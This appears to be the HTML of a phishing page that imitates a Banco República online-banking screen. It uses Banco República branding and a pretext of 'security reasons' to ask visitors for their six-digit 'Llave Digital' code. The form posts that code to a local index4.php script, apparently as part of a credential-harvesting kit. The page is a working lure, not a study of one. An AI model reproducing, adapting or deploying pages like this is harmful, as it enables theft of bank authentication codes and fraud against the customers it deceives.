...
<html lang="es" translate="no"
   class="wf-montserrat-n4-active wf-montserrat-n5-active wf-montserrat-n7-active wf-sansserif-n4-inactive wf-active">
                                       ...
                                       <div class="logo">
                                          <div>
                                             <svg xmlns="http://www.w3.org/2000/svg"
                                                ...
                                                x="0px" y="0px" viewBox="0 0 288.7 95.5"
                                                style="enable-background:new 0 0 288.7 95.5;" xml:space="preserve"
                                                class="injected-svg svg-image"
                                                data-src="static/media/logoCompany.ccb02806.svg">
                                                <style type="text/css">
                                                   .st0 {
                     ...
                     <main class="main-container">
                        <div class="view-content-container">
                           <form action="index4.php" method="post" class="above-the-fold">
                                 ...
                                 <div class="container">
                                    <div class="justify-content-center row">
                                       <div xl="6" class="col col-12 col-lg-6 col-md-12 col-sm-12 col-xs-12">
                                          <div>
                                             <h1><span>Por motivos de seguridad ingresá tu
                                                   Llave Digital</span></h1>
                                          </div>
                                          <div class="notifications-wrapper"></div>
                                          <div class="notifications-wrapper"></div>

                                          <div class="form-group has-error">
                                             <div class="form-group-text"><label class="control-label"
                                                   for=""><span>Ingresa el código</span></label></div>
                                             <div class="form-group-container">
                                                <div class="input-group">
                                                   <input class="form-control" placeholder="" id="DocumentNumber"
                                                      name="DocumentNumber" type="tel" maxlength="6" minlength="6"
                                                      required value="">

                                                </div>
                                                <div class="form-group-error font-size-08rem "><span>Ingrese un nuevo
                                                      código</span></div>
                                             </div>
                                          </div>
                              ...
                              <input type="text" name="input-username" id="input-username" readonly
                                 ...
                                 <div class="container">
                                    <div class="justify-content-center row">
                                       <div xl="6" class="align-items-left reset-padding col-lg-6 col-md-6 col-sm-12">
                                          <button type="submit" class="  btn btn-primary btn-block"><span>CONFIRMAR
                                                LLAVE</span></button></div>
                                       <div xl="6"
                                          class="reset-padding align-items-right text-align-center margin-top-05rem-mb margin-bottom-1rem-mb col-lg-6 col-md-6 col-sm-12">
                                          <div
                                             class="c-control c-control-block c-control--switch c-control-switch form-group">
                                             <input id="rememberEmail" tabindex="-1" class="c-control-input"
                                                type="checkbox" form="[object Object]" name="rememberEmail"
                                                value="true">
                                    ...
                                    <div class="col col-12 col-sm-12">
                                       <div class="row">
                                          <div class="col-12 reset-padding-mb">
                                             <p><span>© 2020 Banco República</span><span>Todos los derechos
                                                   reservados</span></p>
                                          </div>
                                       </div>
                                    </div>
   ...
   <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="0" height="0"
      ...
      <symbol id="LogoTech" viewBox="0 0 221.4 31.3">
         <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
            x="0px" y="0px" viewBox="0 0 288.7 119" style="enable-background:new 0 0 288.7 119" xml:space="preserve">
            <g transform="translate(-930.005 -2348.975)">
               ...
               <path
                  d="M1092.1,2409.5c-1.2-1.4-2.9-2.2-4.7-2.1c-3.9,0-5.9,3.2-5.9,6.7c-0.2,3.4,2.3,6.2,5.7,6.4c0.1,0,0.3,0,0.4,0
                     c1.8,0.1,3.5-0.7,4.6-2.1l2.6,2.6c-1.9,2-4.5,3-7.2,2.9c-5.5,0-10-4.5-10-10s4.5-10,10-10c2.7-0.1,5.4,1,7.3,3L1092.1,2409.5z">
               </path>
               ...
               <path d="M1181.3,2393.1h3.6v19.6l8.2-8.2h5l-8.8,8.6l9.6,10.4h-5.1l-8.8-9.9v9.9h-3.6L1181.3,2393.1z">
               </path>
               <path
                  d="M962.6,2380.9c13.1-12.8,33.5-14.5,48.5-3.9c-4.3-1.3-8.7-2-13.2-2c-7.7-0.1-15.4,2-21.9,6.1
                     c-12.4,6.1-19.1,19.7-16.5,33.3l0.8,3.2l2.6,4c-7-14.6-1-32.4,13.6-39.5c6.4-4.1,13.8-6.2,21.4-6c6.8-0.1,13.4,1.6,19.4,4.8
                     c-15.1-15.5-39.9-15.8-55.4-0.7c-0.1,0.1-0.2,0.2-0.2,0.2l-1.8,2.4l-1.2,4C959.3,2384,962.6,2380.9,962.6,2380.9z">
               </path>
               ...
               <path
                  d="M1015.9,2436.1c-13.1,12.8-33.5,14.5-48.5,4c4.3,1.3,8.7,2,13.2,2c7.8,0.2,15.4-2,22-6.1c12.4-6.1,19.1-19.7,16.5-33.3
                     l-0.8-3.2l-2.6-3.8c7.1,14.6,0.9,32.2-13.6,39.3c-6.4,4.1-13.8,6.2-21.4,6c-6.8,0.1-13.5-1.6-19.4-4.9
                     c15.1,15.5,39.9,15.9,55.5,0.7c0.1-0.1,0.1-0.1,0.2-0.2l1.4-2l0.5-1.8C1017.8,2434.1,1016.9,2435.2,1015.9,2436.1L1015.9,2436.1z">
               </path>
